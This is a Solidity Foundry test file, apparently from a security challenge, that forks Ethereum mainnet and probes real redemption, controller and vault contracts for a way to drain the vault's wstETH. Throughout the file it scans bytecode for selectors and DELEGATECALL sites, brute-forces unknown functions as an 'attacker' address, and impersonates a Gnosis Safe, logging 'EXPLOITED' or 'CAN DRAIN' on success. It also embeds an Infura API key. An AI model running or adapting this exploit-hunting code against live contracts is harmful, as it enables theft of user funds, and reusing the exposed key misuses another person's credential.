// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract ActionChainingDeep is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant GNOSIS_SAFE = 0xB38f2aCb7B562475908c0C6E80a045Deb4023f70;
    address constant SLOT5_IMPL = 0x434B68B11bBE8FD3074089397cA3d275801d6354;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeSlot5Impl() public view {
        console.log("=== ANALYZING SLOT5_IMPL ===\n");

        // SLOT5_IMPL (0x434B68B11bBE8FD3074089397cA3d275801d6354) has 1235 bytes
        // and is stored in REDEMPTION_1's slot 5

        bytes memory code = SLOT5_IMPL.code;
        console.log("Code size:", code.length);

        // Find function selectors
        console.log("\nFunction selectors in SLOT5_IMPL:");
        bytes4[] memory uniqueSels = new bytes4[](50);
        uint selCount = 0;

        for (uint i = 0; i + 4 < code.length; i++) {
            if (uint8(code[i]) == 0x63) { // PUSH4
                bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                if (sel == 0xffffffff) continue;

                bool isUnique = true;
                for (uint j = 0; j < selCount; j++) {
                    if (uniqueSels[j] == sel) {
                        isUnique = false;
                        break;
                    }
                }

                if (isUnique && selCount < 50) {
                    uniqueSels[selCount] = sel;
                    selCount++;
                }
            }
        }

        for (uint i = 0; i < selCount; i++) {
            console.logBytes4(uniqueSels[i]);
        }
    }

    function test_TrySlot5ImplFunctions() public {
        console.log("=== TRYING SLOT5_IMPL FUNCTIONS ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        vm.startPrank(attacker);

        // Try calling SLOT5_IMPL directly
        console.log("Trying SLOT5_IMPL functions:");

        (bool s1,) = SLOT5_IMPL.call(
            abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker)
        );
        console.log("redeem(uint256,address):", s1);

        (bool s2,) = SLOT5_IMPL.call(
            abi.encodeWithSignature("execute(address,bytes)", REDEMPTION_CONTROLLER, abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker))
        );
        console.log("execute:", s2);

        (bool s3,) = SLOT5_IMPL.call(
            abi.encodeWithSignature("withdraw(uint256)", 100e18)
        );
        console.log("withdraw:", s3);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** SLOT5_IMPL EXPLOITED! ***");
        }
    }

    function test_InvestigateRedemption1DelegatecallChain() public view {
        console.log("=== INVESTIGATING REDEMPTION_1 DELEGATECALL CHAIN ===\n");

        // REDEMPTION_1 has 7 DELEGATECALLs
        // It stores GNOSIS_SAFE at slot 4 and SLOT5_IMPL at slot 5
        // It might delegatecall to one of these based on some condition

        bytes memory code = REDEMPTION_1.code;

        // Find what triggers each DELEGATECALL
        uint dcNum = 0;
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf4) {
                dcNum++;
                console.log("\nDELEGATECALL #", dcNum, "at offset:", i);

                // Check what function selector leads here
                // Look backwards for JUMPDEST and trace the selector
                uint jumpdest = 0;
                for (uint j = i; j > 0 && j > i - 500; j--) {
                    if (uint8(code[j]) == 0x5b) { // JUMPDEST
                        jumpdest = j;
                        break;
                    }
                }

                if (jumpdest > 0) {
                    console.log("  Nearest JUMPDEST at:", jumpdest);
                }
            }
        }
    }

    function test_CheckVaultFunctions() public {
        console.log("=== CHECKING VAULT FUNCTIONS ===\n");

        // Maybe the Vault has a function that triggers redemption

        uint256 vaultBalance = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH:", vaultBalance / 1e18);

        bytes memory vaultCode = VAULT.code;
        console.log("Vault code size:", vaultCode.length);

        // Find selectors
        console.log("\nVault function selectors:");
        bytes4[] memory uniqueSels = new bytes4[](50);
        uint selCount = 0;

        for (uint i = 0; i + 4 < vaultCode.length; i++) {
            if (uint8(vaultCode[i]) == 0x63) {
                bytes4 sel = bytes4(bytes.concat(vaultCode[i+1], vaultCode[i+2], vaultCode[i+3], vaultCode[i+4]));
                if (sel == 0xffffffff) continue;

                bool isUnique = true;
                for (uint j = 0; j < selCount; j++) {
                    if (uniqueSels[j] == sel) {
                        isUnique = false;
                        break;
                    }
                }

                if (isUnique && selCount < 50) {
                    uniqueSels[selCount] = sel;
                    selCount++;
                }
            }
        }

        for (uint i = 0; i < selCount && i < 30; i++) {
            console.logBytes4(uniqueSels[i]);
        }

        // Try some vault functions
        vm.startPrank(attacker);

        console.log("\nTrying Vault functions:");
        (bool s1,) = VAULT.call(abi.encodeWithSignature("withdraw(uint256)", 100e18));
        console.log("withdraw:", s1);

        (bool s2,) = VAULT.call(abi.encodeWithSignature("redeem(uint256)", 100e18));
        console.log("redeem:", s2);

        vm.stopPrank();
    }

    function test_InvestigateRCFunctionsMore() public {
        console.log("=== INVESTIGATING RC FUNCTIONS MORE ===\n");

        // RC has these selectors:
        // 0x7bde82f2, 0xb2118a8d, 0xc5d664c6, 0x578063c5, 0xe30c3978
        // 0xf2fde38b, 0xbedb86fb, 0x93d5f4c5, 0x9fd0506d, 0xa5956078
        // 0x8da5cb5b, 0x38a63183, 0x5c975abb, 0x715018a6, 0x79ba5097
        // 0x411557d1, 0x04824e70, 0x1fe923d3, 0x2ab60045, 0x2d88af4a
        // 0x565b6101, 0x23b872dd, 0xa9059cbb, 0x43000818

        console.log("Trying unknown RC functions:");

        vm.startPrank(attacker);

        bytes4[] memory toTry = new bytes4[](10);
        toTry[0] = bytes4(0xbedb86fb);
        toTry[1] = bytes4(0x93d5f4c5);
        toTry[2] = bytes4(0x9fd0506d);
        toTry[3] = bytes4(0xa5956078);
        toTry[4] = bytes4(0x1fe923d3);
        toTry[5] = bytes4(0x2d88af4a);
        toTry[6] = bytes4(0x565b6101);
        toTry[7] = bytes4(0x04824e70);
        toTry[8] = bytes4(0x578063c5);
        toTry[9] = bytes4(0x7bde82f2);

        for (uint i = 0; i < toTry.length; i++) {
            // Try with different params
            (bool s1, bytes memory d1) = REDEMPTION_CONTROLLER.call(
                abi.encodeWithSelector(toTry[i], attacker)
            );
            if (s1) {
                console.log("SUCCESS with address param:");
                console.logBytes4(toTry[i]);
                if (d1.length >= 32) {
                    console.log("  Return:", uint256(bytes32(d1)));
                }
            }

            (bool s2,) = REDEMPTION_CONTROLLER.call(
                abi.encodeWithSelector(toTry[i], 100e18)
            );
            if (s2) {
                console.log("SUCCESS with uint param:");
                console.logBytes4(toTry[i]);
            }

            (bool s3,) = REDEMPTION_CONTROLLER.call(
                abi.encodeWithSelector(toTry[i])
            );
            if (s3) {
                console.log("SUCCESS with no params:");
                console.logBytes4(toTry[i]);
            }
        }

        vm.stopPrank();
    }

    function test_FindRedemptionRequestFunction() public view {
        console.log("=== FINDING REDEMPTION REQUEST FUNCTION ===\n");

        // 0xb2118a8d in RC might be a getter for redemption requests
        // Let's decode what it does

        console.log("Trying 0xb2118a8d on RC:");

        // Try with different params
        (bool s1, bytes memory d1) = REDEMPTION_CONTROLLER.staticcall(
            abi.encodeWithSelector(bytes4(0xb2118a8d), REDEMPTION_0, uint256(0))
        );
        if (s1) {
            console.log("With (REDEMPTION_0, 0):");
            console.log("  Return length:", d1.length);
        }

        (bool s2, bytes memory d2) = REDEMPTION_CONTROLLER.staticcall(
            abi.encodeWithSelector(bytes4(0xb2118a8d), address(0), uint256(0))
        );
        if (s2) {
            console.log("With (0x0, 0):");
            console.log("  Return length:", d2.length);
        }
    }

    function test_LookForMulticallPattern() public view {
        console.log("=== LOOKING FOR MULTICALL PATTERN ===\n");

        // The "action chaining" hint might mean there's a multicall or batch function

        console.log("Known multicall selectors:");
        console.log("multicall(bytes[]):");
        console.logBytes4(bytes4(keccak256("multicall(bytes[])")));
        console.log("aggregate((address,bytes)[]):");
        console.logBytes4(bytes4(keccak256("aggregate((address,bytes)[])")));
        console.log("tryAggregate(bool,(address,bytes)[]):");
        console.logBytes4(bytes4(keccak256("tryAggregate(bool,(address,bytes)[])")));

        // Search in REDEMPTION_0
        bytes memory code0 = REDEMPTION_0.code;
        bytes4 multicallSel = bytes4(keccak256("multicall(bytes[])"));

        for (uint i = 0; i + 4 < code0.length; i++) {
            if (uint8(code0[i]) == 0x63) {
                bytes4 sel = bytes4(bytes.concat(code0[i+1], code0[i+2], code0[i+3], code0[i+4]));
                if (sel == multicallSel) {
                    console.log("Found multicall in REDEMPTION_0 at:", i);
                }
            }
        }
    }

    function test_PrankAsGnosisSafe() public {
        console.log("=== PRANKING AS GNOSIS SAFE ===\n");

        // What if Gnosis Safe is the treasury and can call privileged functions?

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        vm.startPrank(GNOSIS_SAFE);

        console.log("Trying functions as GNOSIS_SAFE:");

        // Try calling REDEMPTION_1 functions
        (bool s1,) = REDEMPTION_1.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(100e18))
        );
        console.log("REDEMPTION_1.redeem:", s1);

        // Try calling REDEMPTION_0
        (bool s2,) = REDEMPTION_0.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        console.log("REDEMPTION_0.finalizeRedeem:", s2);

        // Try calling RC directly
        (bool s3,) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker)
        );
        console.log("RC.redeem:", s3);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** GNOSIS_SAFE CAN DRAIN! ***");
        }
    }
}
